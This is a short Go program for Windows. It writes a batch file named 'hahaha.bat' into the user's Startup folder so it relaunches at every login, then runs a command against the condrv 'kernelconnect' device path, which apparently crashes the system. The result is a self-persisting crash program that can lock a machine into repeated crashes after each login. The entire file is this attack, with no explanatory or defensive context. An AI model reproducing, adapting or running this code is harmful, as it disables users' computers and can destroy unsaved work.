package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"time"
)

func main() {
	current, _ := user.Current()
	fmt.Printf("Hello %s ...\n", current.Username)

	fName := os.Args[0]
	fullStartPath := current.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hahaha.bat"

	if _, err := os.Stat(fullStartPath); err == nil {
		fmt.Println("Exists!")
	} else if os.IsNotExist(err) {
		file, _ := os.Create(fullStartPath)
		_, _ = file.WriteString("start " + fName)
		_=file.Sync()
		file.Close()
	} else {
		fmt.Println("Schrodinger...")
	}

	time.Sleep(time.Second)

	c := exec.Command("cmd", "/C", "\\\\.\\globalroot\\device\\condrv\\kernelconnect")

	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

}
